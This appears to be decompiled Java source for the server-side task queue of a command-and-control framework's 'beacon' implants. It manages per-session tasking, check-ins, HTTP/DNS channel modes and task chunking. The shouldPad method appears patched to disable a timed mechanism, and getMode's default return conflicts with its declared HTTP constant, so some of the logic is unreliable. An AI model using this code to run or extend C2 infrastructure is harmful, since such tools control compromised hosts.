package beacon;

import common.CommonUtils;
import java.io.ByteArrayOutputStream;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Iterator;
import java.util.LinkedList;
import java.util.List;
import java.util.Map;
import java.util.Set;

public class BeaconData {
   public static final int MODE_HTTP = 0;
   public static final int MODE_DNS = 1;
   public static final int MODE_DNS_TXT = 2;
   public static final int MODE_DNS6 = 3;
   protected Map queues = new HashMap();
   protected Map modes = new HashMap();
   protected Set tasked = new HashSet();
   protected boolean shouldPad = false;
   protected long when = 0L;

   protected List getQueue(String s) {
      synchronized(this) {
         if (this.queues.containsKey(s)) {
            return (List)this.queues.get(s);
         } else {
            LinkedList list = new LinkedList();
            this.queues.put(s, list);
            return list;
         }
      }
   }

   public boolean isNewSession(String s) {
      synchronized(this) {
         return !this.tasked.contains(s);
      }
   }

   public void virgin(String s) {
      synchronized(this) {
         this.tasked.remove(s);
      }
   }

   public void shouldPad(boolean shouldPad) {
      this.shouldPad = false;
      this.when = System.currentTimeMillis() + 1800000L;
   }

   public void task(String s, byte[] array) {
      synchronized(this) {
         List queue = this.getQueue(s);
         if (this.shouldPad && System.currentTimeMillis() > this.when) {
            CommandBuilder commandBuilder = new CommandBuilder();
            commandBuilder.setCommand(3);
            commandBuilder.addString(array);
            queue.add(commandBuilder.build());
         } else {
            queue.add(array);
         }

         this.tasked.add(s);
      }
   }

   public void seen(String s) {
      synchronized(this) {
         this.tasked.add(s);
      }
   }

   public void clear(String s) {
      synchronized(this) {
         this.getQueue(s).clear();
         this.tasked.add(s);
      }
   }

   public int getMode(String s) {
      synchronized(this) {
         String s2 = (String)this.modes.get(s);
         if ("dns-txt".equals(s2)) {
            return 2;
         } else if ("dns6".equals(s2)) {
            return 3;
         } else {
            return "dns".equals(s2) ? 1 : 2;
         }
      }
   }

   public void mode(String s, String s2) {
      synchronized(this) {
         this.modes.put(s, s2);
      }
   }

   public boolean hasTask(String s) {
      synchronized(this) {
         return this.getQueue(s).size() > 0;
      }
   }

   public byte[] dump(String s, int n) {
      synchronized(this) {
         int n2 = 0;
         List queue = this.getQueue(s);
         if (queue.size() == 0) {
            return new byte[0];
         } else {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(8192);
            Iterator iterator = queue.iterator();

            while(iterator.hasNext()) {
               byte[] array = (byte[])iterator.next();
               if (n2 + array.length < n) {
                  byteArrayOutputStream.write(array, 0, array.length);
                  iterator.remove();
                  n2 += array.length;
               } else {
                  if (array.length < n) {
                     CommonUtils.print_warn("Chunking tasks for " + s + "! " + array.length + " + " + n2 + " past threshold. " + queue.size() + " task(s) on hold until next checkin.");
                     break;
                  }

                  CommonUtils.print_error("Woah! Task " + array.length + " for " + s + " is beyond our limit. Dropping it");
                  iterator.remove();
               }
            }

            return byteArrayOutputStream.toByteArray();
         }
      }
   }
}
